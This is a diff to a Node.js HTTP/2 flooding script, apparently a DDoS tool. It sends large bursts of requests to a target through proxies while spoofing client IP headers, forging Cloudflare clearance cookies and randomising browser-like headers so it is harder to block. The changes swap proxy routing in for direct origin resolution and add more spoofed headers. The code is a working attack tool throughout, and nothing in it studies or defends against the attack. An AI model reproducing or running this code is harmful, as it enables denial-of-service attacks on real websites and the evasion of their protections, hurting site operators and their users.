@@ -20,7 +20,6 @@ if (process.argv.length < 7) {
     process.exit();
 }
 
-
 const headers = {};
 
 function readLines(filePath) {
@@ -364,7 +363,7 @@ const parsedTarget = url.parse(args.target);
 var multi = { [FA1 + "-" + FAB1]: mad1 + "-" + generateRandomString(4, 25) };
 var multi2 = FAB1 + "-" + FA1 + ": " + mad1 + "-" + generateRandomString(4, 16);
 
-const reflectionsHeaders = [
+const spoofHeaders = [
     { "X-Forwarded-For": ip_spoof() },
     { "X-Forwarded-Host": parsedTarget.host },
     { "X-Forwarded-Scheme": "https" },
@@ -376,10 +375,14 @@ const reflectionsHeaders = [
     { "X-Host": parsedTarget.host },
     { "X-Original-URL": "/" + generateRandomString(5, 15) + "?" + generateRandomString(3, 8) + "=" + generateRandomString(4, 10) },
     { "X-Forwarded-Port": "443" },
-    { "X-Cache-Status": "MISS" },
+    { "X-Cache-Status": "HIT" },
+    { "source-ip": randstr(5) },
+    { "cluster-ip": randstr(5)  },
     { "CF-Visitor": '{"scheme":"https"}' },
     { "CF-Worker": "true" },
+    { "CDN-Loop": "cloudflare" },
     { "CF-Connecting-IP": ip_spoof() },
+    { "True-Client-IP": ip_spoof() },
     { "Via": "1.1" + ip_spoof() + " (squid/3.5.27)" }
 ];
 
@@ -410,6 +413,28 @@ const rateHeaders4 = [
     { "prawgmap": "no-cache" },
     { "Sewc-ch-uwa-Archp": "Private" },
     { "Seac-Gpxcp": "1" }
+];
+
+const rateHeaders5 = [
+    { "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" },
+    { "accept-encoding": "gzip, deflate, br, zstd" },
+    { "accept-language": "en-US,en;q=0.9,id;q=0.8,ja;q=0.7" },
+    { "cache-control": "no-cache, no-store, must-revalidate, private" },
+    { "connection": "keep-alive" },
+    { "priority": "u=0, i" },
+    { "TE": "trailers" },
+    { "Origin": "https://" + parsedTarget.host },
+    { "Referer": Ref },
+    { "User-Agent": uap1 },
+    { "sec-ch-ua": '"Google Chrome";v="133", "Chromium";v="133", "Not_A Brand";v="24"' },
+    { "Sec-Ch-Ua-Mobile": "?0" },
+    { "Sec-Ch-Ua-Platform": '"Windows"' },
+    { "Sec-Ch-Ua-Platform-Version": '"15.0.0"' },
+    { "Sec-Ch-Ua-Model": '""' },
+    { "Sec-Ch-Ua-Full-Version": '"133.0.6943.98"' },
+    { "Sec-Ch-Ua-Arch": '"x86"' },
+    { "Sec-Ch-Ua-Bitness": '"64"' },
+    { "Sec-Ch-Ua-Wow64": "?0" }
 ];
 
 const MAX_RAM_PERCENTAGE = 80;
@@ -506,30 +531,31 @@ const Socker = new NetSocket();
 
 headers[":method"] = "GET";
 headers[":authority"] = parsedTarget.host;
-headers["x-forwarded-proto"] = "https";
 headers[":path"] = (parsedTarget.path || "/") + "?" + randstr(3) + "=" + generateRandomString(10, 15) + "&" + randstr(4) + "=" + randstrs(8);
 headers[":scheme"] = "https";
-headers["X-Forwarded-For"] = spoofed;
 headers["accept"] = accept;
-headers["accept-language"] = lang;
-headers["referer"] = Ref;
 headers["accept-encoding"] = encoding;
-headers["TE"] = "trailers";
-headers["upgrade-insecure-requests"] = "1";
-headers["sec-ch-ua-mobile"] = "?0";
-headers["sec-ch-ua-platform"] = platformx;
-headers["cookie"] = "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15);
-headers["user-agent"] = uap1;
+headers["accept-language"] = lang;
 headers["cache-control"] = control;
 headers["pragma"] = "no-cache";
-headers["priority"] = "u=0, 1";
+headers["referer"] = Ref;
 headers["sec-ch-ua"] = uaas;
-headers["sec-fetch-mode"] = "navigate";
+headers["sec-ch-ua-mobile"] = "?0";
+headers["sec-ch-ua-platform"] = platformx;
 headers["sec-fetch-dest"] = dest1;
-headers["sec-fetch-user"] = "?1";
+headers["sec-fetch-mode"] = "navigate";
 headers["sec-fetch-site"] = site1;
-headers["cdn-loop"] = "cloudflare";
+headers["sec-fetch-user"] = "?1";
 headers["upgrade-insecure-requests"] = "1";
+headers["user-agent"] = uap1;
+headers["cookie"] = "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15);
+headers["priority"] = "u=0, 1";
+//headers["connection"] = "keep-alive";
+headers["cdn-loop"] = "cloudflare";
+headers["x-forwarded-proto"] = "https";
+headers["X-Forwarded-For"] = spoofed;
+headers["TE"] = "trailers";
+headers["dnt"] = "1";
 headers["x-requested-with"] = "XMLHttpRequest";
 
 function shuffleObject(obj) {
@@ -545,126 +571,89 @@ function shuffleObject(obj) {
     return shuffledObject;
 }
 
-// ========== TAMBAHAN FUNGSI ORIGIN RESOLVE ==========
-function resolveOrigin(host) {
-    const dns = require('dns');
-    return new Promise((resolve) => {
-        dns.lookup(host, { family: 4 }, (err, addr) => {
-            if (err) return resolve(null);
-            resolve(addr);
-        });
-    });
-}
+function runFlooder() {
+    const proxyAddr = randomElement(proxies);
+    const parsedProxy = proxyAddr.split(":");
 
-// ========== FIX runFlooder ==========
-async function runFlooder() {
-    const originIP = await resolveOrigin(parsedTarget.host);
-    if (!originIP) return;
-
-    const tlsOptions = {
-        rejectUnauthorized: false,
-        host: parsedTarget.host,
-        servername: parsedTarget.host,
-        ecdhCurve: "X25519:prime256v1",
-        ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256",
-        secureProtocol: "TLS_method",
-        ALPNProtocols: ['h2'],
-        // Spoof JA3
-        sessionIdContext: crypto.randomBytes(32).toString('hex'),
+    const proxyOptions = {
+        host: parsedProxy[0],
+        port: ~~parsedProxy[1],
+        address: parsedTarget.host + ":443",
+        timeout: 10,
     };
 
-    const tlsConn = tls.connect(443, originIP, tlsOptions);
+    Socker.HTTP(proxyOptions, async (connection, error) => {
+        if (error) return;
 
-    tlsConn.setKeepAlive(true, 60000);
-    tlsConn.setTimeout(10000);
+        connection.setKeepAlive(true, 60000);
 
-    const client = http2.connect(`https://${parsedTarget.host}`, {
-        protocol: "https",
-        settings: {
-            headerTableSize: 65536,
-            maxConcurrentStreams: 100,
+        const tlsOptions = {
+            rejectUnauthorized: false,
+            host: parsedTarget.host,
+            servername: parsedTarget.host,
+            socket: connection,
+            ecdhCurve: "X25519:prime256v1",
+            ciphers: cipper,
+            secureProtocol: "TLS_method",
+            ALPNProtocols: ['h2'],
+        };
+
+        const tlsConn = await tls.connect(443, parsedTarget.host, tlsOptions);
+        tlsConn.setKeepAlive(true, 60000);
+
+        const client = await http2.connect(parsedTarget.href, {
+            protocol: "https",
+            settings: {
+                headerTableSize: 8192,
+                maxConcurrentStreams: 1000,
+                initialWindowSize: 65535,
+                maxHeaderListSize: 16384,
+                maxFrameSize: 32768,
+                enablePush: false,
+            },
+            maxSessionMemory: 3333,
+            maxDeflateDynamicTableSize: 4294967295,
+            createConnection: () => tlsConn,
+            socket: connection,
+        });
+
+        client.settings({
+            headerTableSize: 8192,
+            maxConcurrentStreams: 1000,
             initialWindowSize: 65535,
-            maxHeaderListSize: 65536,
-            maxFrameSize: 16384,
+            maxHeaderListSize: 16384,
+            maxFrameSize: 32768,
             enablePush: false,
-        },
-        createConnection: () => tlsConn,
-        peerMaxConcurrentStreams: 100,
-    });
+        });
 
-    client.settings({
-        headerTableSize: 65536,
-        maxConcurrentStreams: 100,
-        initialWindowSize: 65535,
-        maxHeaderListSize: 65536,
-        maxFrameSize: 16384,
-        enablePush: false,
-    });
+        let IntervalAttack;
 
-    let attackInterval;
-    let counter = 0;
+        client.on("connect", async () => {
+            IntervalAttack = setInterval(() => {
+                const shuffledHeaders = shuffleObject({
+                    ...headers,
+                    ...multi,
+                    ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
+                    ...rateHeaders2[Math.floor(Math.random() * rateHeaders2.length)],
+                    ...rateHeaders3[Math.floor(Math.random() * rateHeaders3.length)],
+                    ...rateHeaders4[Math.floor(Math.random() * rateHeaders4.length)],
+                    ...rateHeaders5[Math.floor(Math.random() * rateHeaders5.length)],
+                    ...spoofHeaders[Math.floor(Math.random() * spoofHeaders.length)],
+                });
 
-    client.on("connect", () => {
-        attackInterval = setInterval(() => {
-            const shuffledHeaders = shuffleObject({
-                ...headers,
-                ...multi,
-                "x-forwarded-for": ip_spoof(),
-                "x-real-ip": ip_spoof(),
-                "cf-connecting-ip": ip_spoof(),
-                "true-client-ip": ip_spoof(),
-                "x-original-forwarded-for": ip_spoof(),
-                "cache-control": "no-cache, no-store, must-revalidate",
-                "pragma": "no-cache",
-                "expires": "0",
-                "user-agent": randomElement(uap),
-                "accept": randomElement(accept_header),
-                "accept-language": randomElement(lang_header),
-                "accept-encoding": "gzip, deflate, br",
-                "referer": randomElement(refers),
-                "sec-ch-ua": randomElement(uaa),
-                "sec-ch-ua-platform": randomElement(platformd),
-                "sec-fetch-site": randomElement(site),
-                "sec-fetch-mode": "navigate",
-                "sec-fetch-dest": randomElement(dest),
-                "upgrade-insecure-requests": "1",
-                "priority": `u=${Math.floor(Math.random()*3)}, ${Math.floor(Math.random()*2)}`,
-            });
-
-            for (let i = 0; i < Math.floor(args.Rate / 2); i++) {
-                const pathRand = (parsedTarget.path || "/") + "?" + randstr(5) + "=" + randstrs(10) + "&" + randstr(4) + "=" + randstrs(6);
-                const reqHeaders = {
-                    ...shuffledHeaders,
-                    ":path": pathRand,
-                    ":method": Math.random() > 0.7 ? "POST" : "GET",
-                };
-                const request = client.request(reqHeaders);
-                request.on('response', () => { request.close(); request.destroy(); });
-                if (Math.random() > 0.8) {
-                    request.write(crypto.randomBytes(64).toString('hex'));
+                for (let i = 0; i < args.Rate; i++) {
+                    const request = client.request(shuffledHeaders);
+                    request.on('response', () => { request.close(); request.destroy(); });
+                    request.end();
                 }
-                request.end();
-                counter++;
-            }
-        }, 500 + Math.floor(Math.random() * 300)); // random delay biar ga kelihatan
-    });
+            }, Math.floor(Math.random() * 1000) + 500);
+        });
 
-    client.on("close", () => {
-        clearInterval(attackInterval);
-        client.destroy();
-        tlsConn.destroy();
-    });
-
-    client.on("error", () => {
-        clearInterval(attackInterval);
-        client.destroy();
-        tlsConn.destroy();
-    });
-
-    tlsConn.on("error", () => {
-        clearInterval(attackInterval);
-        client.destroy();
-        tlsConn.destroy();
+        client.on("close", () => {
+            clearInterval(IntervalAttack);
+            client.destroy();
+            connection.destroy();
+        });
     });
 }
 
